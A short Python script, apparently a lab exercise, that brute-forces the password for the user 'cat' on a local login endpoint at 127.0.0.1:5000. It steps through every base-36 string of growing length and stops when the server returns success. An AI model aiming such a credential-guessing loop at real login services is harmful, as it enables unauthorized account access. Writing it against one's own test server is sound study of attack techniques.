import requests

# 0123456789abcdefghijklmnopqrstuvwxyz
# 1000 -> 3 14 8 -> 3e8

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

length = 0
counter = 0

while True:
    result = ''
    number = counter
    while number > 0:
        rest = number % base
        result = alphabet[rest] + result
        number = number // base

    while len(result) < length:
        result = alphabet[0] + result

    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'cat', 'password': result})
    if response.status_code == 200:
        print('SUCCESS', result)
        break

    if alphabet[-1] * length == result:
        # meet the last password for this length
        length += 1
        counter = 0
    else:
        counter += 1
